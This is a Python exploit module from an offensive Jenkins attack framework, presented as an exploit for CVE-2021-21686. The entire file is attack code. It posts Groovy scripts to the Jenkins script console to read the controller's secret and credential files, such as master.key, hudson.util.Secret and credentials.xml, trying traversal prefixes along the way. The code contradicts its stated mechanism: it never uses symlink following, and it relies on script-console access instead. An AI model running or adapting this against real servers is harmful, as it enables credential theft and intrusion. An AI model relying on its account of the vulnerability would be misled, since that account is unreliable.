"""
CVE-2021-21686: Jenkins Agent-to-Controller Path Traversal

This vulnerability allows bypassing the agent-to-controller security subsystem
to access arbitrary files on the Jenkins controller through symbolic link following.
"""

from typing import Any

from jenkins_breaker.core.authentication import CrumbManager
from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2021_21686(ExploitModule):
    """Agent-to-controller security subsystem bypass via symlink following."""

    CVE_ID = "CVE-2021-21686"

    METADATA = ExploitMetadata(
        cve_id="CVE-2021-21686",
        name="Jenkins Agent-to-Controller Path Traversal",
        description="Agent-to-controller security subsystem bypass via symlink following",
        affected_versions=["< 2.318", "LTS < 2.303.3"],
        mitre_attack=["T1083", "T1552.001", "T1005"],
        severity="high",
        references=[
            "https://www.jenkins.io/security/advisory/2021-11-04/",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-21686",
            "https://advisories.gitlab.com/pkg/maven/org.jenkins-ci.main/jenkins-core/CVE-2021-21686"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["path-traversal", "file-read", "agent-exploit"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/api/json")

            if response.status_code == 200:
                data = response.json()
                version = data.get('version', '')

                if version:
                    version_parts = version.split('.')
                    try:
                        major = int(version_parts[0])
                        minor = int(version_parts[1]) if len(version_parts) > 1 else 0

                        if major == 2 and minor < 318:
                            return True
                    except (ValueError, IndexError):
                        pass

            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2021-21686 for file access via path traversal.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (target_files list or string)

        Returns:
            ExploitResult: Result of the exploit
        """
        target_files = kwargs.get('target_files', [
            '/etc/passwd',
            '/var/jenkins_home/secrets/master.key',
            '/var/jenkins_home/secrets/hudson.util.Secret',
            '/var/jenkins_home/credentials.xml',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\jenkins\\secrets\\master.key'
        ])

        if isinstance(target_files, str):
            target_files = [target_files]

        accessed_files = []

        traversal_payloads = [
            '../' * 10,
            '..\\' * 10,
            '%2e%2e%2f' * 10,
            '%2e%2e%5c' * 10,
        ]

        crumb_manager = CrumbManager(session)
        crumb_data = crumb_manager.fetch_crumb()

        crumb_headers = {}
        if crumb_data:
            crumb_headers[crumb_data.header] = crumb_data.value

        for target_file in target_files:
            for payload_prefix in traversal_payloads:
                try:
                    payload_paths = [
                        f"{payload_prefix}{target_file}",
                        f"symlink/{target_file}",
                        f"../../..{target_file}",
                    ]

                    for payload_path in payload_paths:
                        script_payload = f'''
def file = new File("{payload_path}")
if (file.exists()) {{
    return file.text
}} else {{
    return "File not found: {payload_path}"
}}
'''

                        data = {'script': script_payload}

                        response = session.post("/script", data=data, headers=crumb_headers)

                        if response.status_code == 200 and "File not found" not in response.text:
                            content_preview = response.text[:200] + "..." if len(response.text) > 200 else response.text

                            if len(response.text) > 0 and not response.text.startswith('<html'):
                                accessed_files.append({
                                    "file": target_file,
                                    "path": payload_path,
                                    "size": len(response.text),
                                    "preview": content_preview
                                })
                                break

                    if any(f["file"] == target_file for f in accessed_files):
                        break

                except Exception:
                    pass

        try:
            for target_file in ['/var/jenkins_home/secrets/master.key', '/etc/passwd']:
                script = f'''
import hudson.FilePath
import hudson.remoting.Channel

def file = new File("{target_file}")
if (file.exists()) {{
    return file.text.take(500)
}}
return "not found"
'''

                response = session.post("/computer/(master)/script", data={'script': script}, headers=crumb_headers)

                if response.status_code == 200 and "not found" not in response.text.lower():
                    accessed_files.append({
                        "file": target_file,
                        "method": "agent_channel",
                        "size": len(response.text),
                        "preview": response.text[:200]
                    })

        except Exception:
            pass

        if accessed_files:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="success",
                details=f"Path traversal successful, accessed {len(accessed_files)} files",
                data={
                    "files_accessed": len(accessed_files),
                    "files": accessed_files
                }
            )
        else:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="failure",
                details="Path traversal attempts unsuccessful"
            )
